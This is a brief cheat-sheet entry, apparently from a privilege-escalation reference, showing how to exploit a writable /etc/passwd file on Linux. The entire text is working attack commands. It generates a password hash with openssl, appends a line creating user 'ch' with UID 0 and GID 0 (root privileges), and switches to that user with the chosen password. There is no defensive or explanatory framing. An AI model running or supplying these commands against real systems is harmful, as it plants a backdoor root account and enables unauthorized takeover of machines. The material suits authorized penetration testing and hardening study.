# Writable /etc/passwd file

```
$ openssl passwd -1 -salt ignite pass123
$1$ignite$3eTbJm98O9Hz.k1NTdNxe1

$ echo "ch:\$1\$ignite\$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash" >> /etc/passwd

$ su ch
password: pass123
```
